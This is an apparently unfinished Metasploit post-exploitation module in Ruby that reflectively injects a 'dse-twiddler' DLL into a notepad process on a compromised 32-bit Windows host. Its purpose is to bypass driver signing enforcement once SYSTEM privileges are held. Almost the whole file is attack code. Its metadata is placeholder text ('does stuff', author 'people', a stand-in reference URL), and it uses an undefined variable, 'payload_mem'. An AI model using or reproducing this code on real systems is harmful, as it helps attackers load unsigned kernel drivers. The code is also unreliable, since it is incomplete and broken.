##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Driver Signing Enforcement Bypass',
      'Description'   => %q{
          This module does stuff to driver signing enforcement.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'people'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
        [
          [ 'URL', 'github url for dsefix and maybe some article on the process' ]
        ],
    ))
  end

  def run
    unless is_system?
      fail_with(Failure::None, 'Module requires SYSTEM privileges')
    end

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, "Running against WOW64 is not supported")
    elsif sysinfo["Architecture"] =~ /x64/
      fail_with(Failure::NoTarget, "Running against 64-bit systems is not supported")
    end

    print_status("Launching notepad to host the process ...")
    notepad_process_pid = cmd_exec_get_pid("notepad.exe")
    begin
      process = client.sys.process.open(notepad_process_pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      print_status("Operation failed. Hosting process inside current process ...")
      process = client.sys.process.open
    end

    print_status("Reflectively injecting DSE DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits", "dse-twiddler", "dse-twiddler.dll")
    library_path = ::File.expand_path(library_path)
    proc_mem, offset = inject_dll_into_process(process, library_path)
    thread = process.thread.create(proc_mem + offset, payload_mem)
    sleep(3)
    print_status("Done.")
  end
 end

